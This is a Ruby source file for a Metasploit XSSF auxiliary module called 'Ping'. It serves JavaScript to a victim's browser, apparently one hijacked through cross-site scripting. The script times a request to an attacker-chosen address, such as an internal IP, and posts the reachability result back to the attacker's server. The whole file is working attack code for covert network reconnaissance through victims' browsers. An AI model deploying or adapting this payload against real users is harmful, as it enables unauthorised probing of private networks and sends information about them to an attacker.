require 'msf/core'
require 'msf/base/xssf'

#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Simple ping done by victim
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Ping',
			'Description' => 'Simple ping done by victim'
		))
		
		register_options(
			[
				OptAddress.new('address', [true, 'IP adress to ping', '192.168.1.1'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)	
			code = %Q{
				function AJAXInteraction(url) {
					var d = new Date;
					xhr.onreadystatechange = processRequest;
				 
					function processRequest () {
						if (xhr.readyState == 4) {
							var d2 = new Date;
							var time = d2.getTime() - d.getTime();

							if (time < 18000)
								if (time > 10)
									XSSF_POST("Ping OK : " + url, '#{self.name}');
								else
									XSSF_POST("Ping FAIL : " + url, '#{self.name}');
							else
								XSSF_POST("Ping FAIL : " + url, '#{self.name}');
						}
					}
				 
					this.doGet = function() {
					  xhr.open("GET", url, true);
					  xhr.send();
					}
				}
				 
				var ai = new AJAXInteraction('#{datastore['address']}');
				ai.doGet();
			}

		send_response(cli, code)
	end
end